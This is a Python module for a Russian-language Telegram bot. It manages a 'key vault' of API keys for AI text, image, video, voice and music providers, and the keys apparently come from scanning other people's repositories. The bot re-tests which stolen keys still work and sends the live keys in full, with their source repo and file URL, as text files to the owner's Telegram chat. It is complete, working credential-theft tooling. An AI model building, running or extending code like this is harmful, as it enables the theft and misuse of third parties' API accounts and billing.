"""
Telegram interactive key vault — inline keyboard menu.
Pure httpx long-polling, no extra dependencies.

Flow:
  /start | /keys  →  main menu  (categories with live counts)
  category btn    →  sub-menu   (providers with counts + "All in …")
  provider btn    →  re-validate → send .txt file
  "All in …" btn  →  re-validate all in category → send .txt file
  📊 Stats        →  DB summary (edits current message)
  🔄 Reval All    →  re-validate every is_valid=1 key → summary

Security: only TELEGRAM_CHAT_ID can interact (all other senders get ignored).
"""

import asyncio
import io
import logging
from datetime import datetime, timezone

import httpx

import db
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
from validators import validate as _validate

log = logging.getLogger(__name__)

_BASE  = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
_OWNER = str(TELEGRAM_CHAT_ID)

# ── Provider metadata (emoji + display name) ──────────────────────────────
_PROV: dict[str, dict] = {
    "openai":       {"e": "🟢", "n": "OpenAI GPT"},
    "openai_image": {"e": "🖼️",  "n": "OpenAI DALL·E"},
    "anthropic":    {"e": "🟣", "n": "Anthropic Claude"},
    "google":       {"e": "🔵", "n": "Google Gemini"},
    "deepseek":     {"e": "🟡", "n": "DeepSeek"},
    "kimi":         {"e": "🌙", "n": "Kimi / Moonshot"},
    "glm":          {"e": "💜", "n": "Zhipu GLM"},
    "grok":         {"e": "✖️",  "n": "xAI Grok"},
    "together":     {"e": "🤝", "n": "Together AI"},
    "perplexity":   {"e": "🔮", "n": "Perplexity"},
    "mistral":      {"e": "🌬️", "n": "Mistral AI"},
    "cohere":       {"e": "🌊", "n": "Cohere"},
    "groq":         {"e": "⚡", "n": "Groq"},
    "openrouter":   {"e": "🔀", "n": "OpenRouter"},
    "huggingface":  {"e": "🤗", "n": "HuggingFace"},
    "ark":          {"e": "🔴", "n": "Seedance 2.0 Std"},
    "ark_fast":     {"e": "🚀", "n": "Seedance 2.0 Fast"},
    "happyhorse":   {"e": "🐴", "n": "HappyHorse"},
    "kling":        {"e": "🎞️",  "n": "Kling AI"},
    "runway":       {"e": "✈️",  "n": "Runway ML"},
    "fal":          {"e": "⚗️", "n": "fal.ai"},
    "replicate":    {"e": "🔁", "n": "Replicate"},
    "fireworks":    {"e": "🎆", "n": "Fireworks AI"},
    "elevenlabs":   {"e": "🟠", "n": "ElevenLabs"},
    "inworld":      {"e": "🗣️",  "n": "Inworld AI"},
    "suno":         {"e": "🎵", "n": "Suno Music"},
}

# ── Category → provider mapping ───────────────────────────────────────────
_CATS: dict[str, dict] = {
    "video": {
        "e": "🎬", "n": "AI Video",
        "p": ["ark", "ark_fast", "happyhorse", "kling", "runway", "fal", "replicate", "fireworks"],
    },
    "text": {
        "e": "💬", "n": "AI Text",
        "p": ["openai", "anthropic", "google", "deepseek", "kimi", "glm", "grok",
              "together", "perplexity", "mistral", "cohere", "groq", "openrouter", "huggingface"],
    },
    "image": {
        "e": "🖼️", "n": "AI Image",
        "p": ["openai_image", "fal", "replicate", "fireworks"],
    },
    "voice": {
        "e": "🎙️", "n": "AI Voice",
        "p": ["elevenlabs", "inworld"],
    },
    "music": {
        "e": "🎵", "n": "AI Music",
        "p": ["suno"],
    },
    "all": {
        "e": "🔌", "n": "All Providers",
        "p": list(_PROV.keys()),
    },
}

# ── Telegram API wrapper ──────────────────────────────────────────────────

async def _api(client: httpx.AsyncClient, method: str, **kw) -> dict:
    try:
        r = await client.post(f"{_BASE}/{method}", json=kw, timeout=35)
        data = r.json()
        if not data.get("ok"):
            log.debug("tg %s nok: %s", method, data.get("description", ""))
        return data
    except Exception as e:
        log.debug("tg %s err: %s", method, e)
        return {}


# ── Menu builders ─────────────────────────────────────────────────────────

def _counts() -> dict[str, int]:
    return db.get_valid_count_by_provider()


def _main_text() -> str:
    return (
        "🔑 <b>Key Vault</b>\n\n"
        "Выбери категорию — покажу провайдеры с живыми ключами.\n"
        "Перед отправкой файла — <b>авто-перевалидация</b>."
    )


def _main_keyboard(counts: dict[str, int]) -> dict:
    rows = []
    for cid in ("video", "text", "image", "voice", "music", "all"):
        cat   = _CATS[cid]
        total = sum(counts.get(p, 0) for p in cat["p"])
        rows.append([{"text": f"{cat['e']} {cat['n']}  ({total})", "callback_data": f"c:{cid}"}])
    rows.append([
        {"text": "📊 Stats",      "callback_data": "s"},
        {"text": "🔄 Reval All", "callback_data": "rv"},
    ])
    return {"inline_keyboard": rows}


def _cat_text(cid: str, counts: dict[str, int]) -> str:
    cat   = _CATS[cid]
    lines = [f"{cat['e']} <b>{cat['n']}</b>\n"]
    for prov in cat["p"]:
        cnt  = counts.get(prov, 0)
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        mark = "✅" if cnt > 0 else "⬜"
        lines.append(f"  {mark} {meta['e']} {meta['n']}: <b>{cnt}</b>")
    lines.append("\nВыбери провайдер или забери всё сразу.")
    return "\n".join(lines)


def _cat_keyboard(cid: str, counts: dict[str, int]) -> dict:
    cat  = _CATS[cid]
    rows = []
    buf  = []
    for prov in cat["p"]:
        cnt  = counts.get(prov, 0)
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        buf.append({"text": f"{meta['e']} {meta['n']} ({cnt})", "callback_data": f"p:{prov}"})
        if len(buf) == 2:
            rows.append(buf)
            buf = []
    if buf:
        rows.append(buf)
    total = sum(counts.get(p, 0) for p in cat["p"])
    rows.append([{"text": f"📦 Все {cat['n']} ({total})", "callback_data": f"g:{cid}"}])
    rows.append([{"text": "◀ Назад", "callback_data": "m"}])
    return {"inline_keyboard": rows}


# ── Key export helpers ────────────────────────────────────────────────────

_SEM: asyncio.Semaphore | None = None


def _get_sem() -> asyncio.Semaphore:
    global _SEM
    if _SEM is None:
        _SEM = asyncio.Semaphore(8)
    return _SEM


async def _revalidate_and_export(
    providers: list[str],
    label: str,
) -> tuple[bytes, int, int, int]:
    """
    Re-validate all is_valid=1 keys for the given providers concurrently.
    Returns (txt_bytes, total_checked, n_alive, n_dead).
    """
    all_rows: list[dict] = []
    for prov in providers:
        all_rows.extend(db.get_valid_keys_by_provider(prov))

    if not all_rows:
        return b"", 0, 0, 0

    async def _one(row: dict) -> bool:
        async with _get_sem():
            ok = await _validate(row["provider"], row["key_full"])
        db.update_key_validity(row["key_hash"], ok)
        return ok

    results = await asyncio.gather(*(_one(r) for r in all_rows))
    alive = sum(1 for r in results if r)
    dead  = sum(1 for r in results if not r)

    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    lines = [
        "╔══════════════════════════════════════════════════════════════════════╗",
        f"║  {label}",
        f"║  Exported: {now_str}",
        f"║  Checked: {len(all_rows)}  |  ✅ Valid: {alive}  |  ❌ Dead (removed): {dead}",
        "╚══════════════════════════════════════════════════════════════════════╝",
        "",
    ]

    by_prov: dict[str, list[dict]] = {}
    for row, ok in zip(all_rows, results):
        if ok:
            by_prov.setdefault(row["provider"], []).append(row)

    if not by_prov:
        lines.append("  (no live keys found after re-validation)")
    else:
        for prov in sorted(by_prov):
            rows_p = by_prov[prov]
            meta   = _PROV.get(prov, {"e": "🔑", "n": prov})
            lines.append("─" * 70)
            lines.append(f"  {meta['e']}  {meta['n'].upper()} — {len(rows_p)} key{'s' if len(rows_p) != 1 else ''}")
            lines.append("─" * 70)
            for r in rows_p:
                lines.append(f"  {r['key_full']}")
                lines.append(f"    📁 {r.get('repo', '?')}  |  {r.get('file_url', '')}")
            lines.append("")

    return "\n".join(lines).encode("utf-8"), len(all_rows), alive, dead


# ── Message / callback handlers ───────────────────────────────────────────

async def _handle_message(client: httpx.AsyncClient, msg: dict):
    chat_id = str(msg.get("chat", {}).get("id", ""))
    if chat_id != _OWNER:
        return
    text = msg.get("text", "")
    if text in ("/start", "/keys"):
        counts = _counts()
        await _api(client, "sendMessage",
                   chat_id=chat_id,
                   text=_main_text(),
                   parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))


async def _handle_callback(client: httpx.AsyncClient, cbq: dict):
    msg     = cbq.get("message", {})
    chat_id = str(msg.get("chat", {}).get("id", ""))
    msg_id  = msg.get("message_id")
    cbq_id  = cbq.get("id", "")
    data    = cbq.get("data", "")

    if chat_id != _OWNER:
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="❌ Not authorized")
        return

    # ── Main menu ─────────────────────────────────────────────────────
    if data == "m":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        counts = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=_main_text(), parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))
        return

    # ── Category sub-menu ─────────────────────────────────────────────
    if data.startswith("c:"):
        cid = data[2:]
        if cid not in _CATS:
            await _api(client, "answerCallbackQuery", callback_query_id=cbq_id, text="?")
            return
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        counts = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=_cat_text(cid, counts), parse_mode="HTML",
                   reply_markup=_cat_keyboard(cid, counts))
        return

    # ── Stats ─────────────────────────────────────────────────────────
    if data == "s":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        s     = db.get_stats()
        lines = [
            "📊 <b>Database Stats</b>",
            "",
            f"📁 Repos scanned:  <b>{s['repos_scanned']}</b>",
            f"📄 Files scanned:  <b>{s['files_scanned']}</b>",
            f"🔑 Keys found:     <b>{s['keys_found']}</b>",
            f"✅ Keys valid:     <b>{s['keys_valid']}</b>",
            "",
            "<b>By provider:</b>",
        ]
        for row in s.get("by_provider", []):
            if row["total"] == 0:
                continue
            meta = _PROV.get(row["provider"], {"e": "🔑", "n": row["provider"]})
            v    = row["valid"]
            t    = row["total"]
            mark = "✅" if v > 0 else "  "
            lines.append(f"{mark} {meta['e']} {meta['n']}: {t} found, <b>{v} valid</b>")
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text="\n".join(lines), parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # ── Revalidate all ────────────────────────────────────────────────
    if data == "rv":
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Запускаю…")
        rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
        if not rows:
            back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text="ℹ️ Нет ключей для перевалидации.",
                       reply_markup=back_kb)
            return

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"⏳ Перевалидирую <b>{len(rows)}</b> ключей… подожди.",
                   parse_mode="HTML")

        async def _one(row: dict) -> bool:
            async with _get_sem():
                ok = await _validate(row["provider"], row["key_full"])
            db.update_key_validity(row["key_hash"], ok)
            return ok

        results  = await asyncio.gather(*(_one(r) for r in rows))
        dead     = sum(1 for r in results if not r)
        alive    = sum(1 for r in results if r)
        counts   = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"✅ <b>Перевалидация готова</b>\n\n"
                         f"Проверено: {len(rows)}\n"
                         f"✅ Живых: <b>{alive}</b>\n"
                         f"❌ Мёртвых: <b>{dead}</b>"),
                   parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))
        return

    # ── Get single provider ───────────────────────────────────────────
    if data.startswith("p:"):
        prov = data[2:]
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Перевалидирую…")
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"⏳ {meta['e']} <b>{meta['n']}</b> — перевалидация…",
                   parse_mode="HTML")

        content, checked, alive, dead = await _revalidate_and_export(
            [prov], f"{meta['e']} {meta['n']} — Key Export"
        )
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}

        if not content or alive == 0:
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                             f"Проверено: {checked}  ❌ Мёртвых: {dead}\n"
                             "<i>Живых ключей нет.</i>"),
                       parse_mode="HTML",
                       reply_markup=back_kb)
            return

        fname = f"{prov}_keys_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                         f"✅ Живых: {alive}  |  ❌ Мёртвых: {dead}\n"
                         "Отправляю файл…"),
                   parse_mode="HTML")
        try:
            async with httpx.AsyncClient(timeout=60) as fc:
                await fc.post(
                    f"{_BASE}/sendDocument",
                    data={"chat_id": chat_id,
                          "caption": f"{meta['e']} {meta['n']}: {alive} live key{'s' if alive != 1 else ''}",
                          "parse_mode": "HTML"},
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
        except Exception as e:
            log.error("bot send doc err: %s", e)

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                         f"✅ {alive} ключей отправлено\n"
                         f"❌ {dead} убрано из базы"),
                   parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # ── Get all in category ───────────────────────────────────────────
    if data.startswith("g:"):
        cid = data[2:]
        if cid not in _CATS:
            await _api(client, "answerCallbackQuery", callback_query_id=cbq_id, text="?")
            return
        cat = _CATS[cid]
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Перевалидирую…")
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"{cat['e']} <b>{cat['n']}</b> — перевалидация…",
                   parse_mode="HTML")

        content, checked, alive, dead = await _revalidate_and_export(
            cat["p"], f"{cat['e']} {cat['n']} — Key Export"
        )
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}

        if not content or alive == 0:
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                             f"Проверено: {checked}  ❌ Мёртвых: {dead}\n"
                             "<i>Живых ключей нет.</i>"),
                       parse_mode="HTML",
                       reply_markup=back_kb)
            return

        fname = f"{cid}_keys_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                         f"✅ Живых: {alive}  |  ❌ Мёртвых: {dead}\n"
                         "Отправляю файл…"),
                   parse_mode="HTML")
        try:
            async with httpx.AsyncClient(timeout=60) as fc:
                await fc.post(
                    f"{_BASE}/sendDocument",
                    data={"chat_id": chat_id,
                          "caption": f"{cat['e']} {cat['n']}: {alive} live key{'s' if alive != 1 else ''}"},
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
        except Exception as e:
            log.error("bot send doc err: %s", e)

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                         f"✅ {alive} ключей отправлено\n"
                         f"❌ {dead} убрано из базы"),
                   parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # unknown data — just ack
    await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)


# ── Main polling loop ─────────────────────────────────────────────────────

async def bot_loop():
    """Long-poll Telegram getUpdates. Runs forever — cancelled on app shutdown."""
    if not TELEGRAM_BOT_TOKEN:
        log.info("tg_bot: TELEGRAM_BOT_TOKEN not set — bot disabled")
        return
    if not _OWNER or _OWNER == "0":
        log.info("tg_bot: TELEGRAM_CHAT_ID not set — bot disabled")
        return

    log.info("tg_bot: starting long-poll loop (owner=%s)", _OWNER)
    offset = 0

    async with httpx.AsyncClient(timeout=40) as client:
        while True:
            try:
                data = await _api(
                    client, "getUpdates",
                    offset=offset,
                    timeout=30,
                    allowed_updates=["message", "callback_query"],
                )
                updates = data.get("result") or []
                for upd in updates:
                    offset = upd["update_id"] + 1
                    try:
                        if "message" in upd:
                            await _handle_message(client, upd["message"])
                        elif "callback_query" in upd:
                            await _handle_callback(client, upd["callback_query"])
                    except Exception as e:
                        log.error("bot update handler err: %s", e)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                log.error("bot poll err: %s", e)
                await asyncio.sleep(5)
